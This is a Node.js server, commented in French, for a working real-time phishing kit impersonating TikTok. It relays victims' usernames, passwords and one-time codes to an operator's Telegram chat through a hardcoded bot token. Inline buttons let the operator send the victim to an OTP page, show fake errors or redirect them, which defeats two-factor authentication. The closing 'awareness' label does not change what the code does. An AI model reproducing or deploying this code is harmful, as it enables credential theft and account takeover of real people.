const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

// --- 🔑 CONFIGURATION ---
const token = '8777300694:AAEYGcNh9niBTeZ-BLROET2ZSxhDQcwyNE4'; 
const chatId = '8608663204'; 
const bot = new TelegramBot(token, {polling: true});

app.use(express.static('public'));

let activeSocket = null; 

// --- 🤖 LOGIQUE TELEGRAM (Contrôle) ---

bot.on('callback_query', (query) => {
    const action = query.data;
    if (!activeSocket) return bot.answerCallbackQuery(query.id, {text: "❌ Session inactive"});

    if (action === 'DEMANDER_OTP') {
        activeSocket.emit('goToOTP');
        bot.sendMessage(chatId, "🚀 Ordre envoyé : Chargement de la page OTP.");
    } 
    else if (action === 'INFOS_INCORRECTES') {
        activeSocket.emit('loginError');
        bot.sendMessage(chatId, "⚠️ Ordre envoyé : Message d'erreur affiché.");
    }else if (action === 'OTP_ERROR') {
    activeSocket.emit('loginError'); // On réutilise l'alerte d'erreur
    bot.sendMessage(chatId, "❌ Tu as signalé que l'OTP est incorrect.");
}
    else if (action === 'ACTION_REDIRECT') {
        activeSocket.emit('final_redirect_order');
        bot.sendMessage(chatId, "✅ Victime redirigée vers TikTok.");
    }
    
    bot.answerCallbackQuery(query.id);
});

// --- 🌐 LOGIQUE WEB (Socket.io) ---

io.on('connection', (socket) => {
    activeSocket = socket;
    console.log("--- Connexion établie avec le navigateur ---");

    // 1. Alerte d'ouverture
    socket.on('page_viewed', () => {
        bot.sendMessage(chatId, "👀 *Quelqu'un vient d'ouvrir le lien TikTok !*", { parse_mode: 'Markdown' });
    });

    // 2. Réception Login
    socket.on('login_attempt', (data) => {
        const report = `🔔 *NOUVELLE CONNEXION !*\n\n👤 User: \`${data.user}\`\n🔑 Pass: \`${data.pass}\`\n\nQue voulez-vous faire ?`;
        const keyboard = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Page OTP', callback_data: 'DEMANDER_OTP' },
                        { text: '❌ Erreur', callback_data: 'INFOS_INCORRECTES' }
                    ]
                ]
            }
        };
        bot.sendMessage(chatId, report, { parse_mode: 'Markdown', ...keyboard });
    });

    // 3. Réception OTP
    // 3. Réception de l'OTP depuis le navigateur
socket.on('otp_submit', (data) => {
    const otpMsg = `🔐 *OTP REÇU !*\n\n👤 User: \`${data.user}\`\n🔢 Code: \`${data.code}\`\n\nQue voulez-vous faire ?`;
    
    const otpKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🚀 Valider & Rediriger', callback_data: 'ACTION_REDIRECT' },
                    { text: '⚠️ Code Incorrect', callback_data: 'OTP_ERROR' }
                ]
            ]
        }
    };
    bot.sendMessage(chatId, otpMsg, { parse_mode: 'Markdown', ...otpKeyboard });
});

    socket.on('disconnect', () => {
        console.log("Déconnexion de la victime.");
    });
});

// --- DÉMARRAGE ---
const PORT = 3000;
http.listen(PORT, () => {
    console.log(`\n✅ Serveur actif sur http://localhost:${PORT}`);
    console.log(`🚀 Prêt pour la sensibilisation !\n`);
});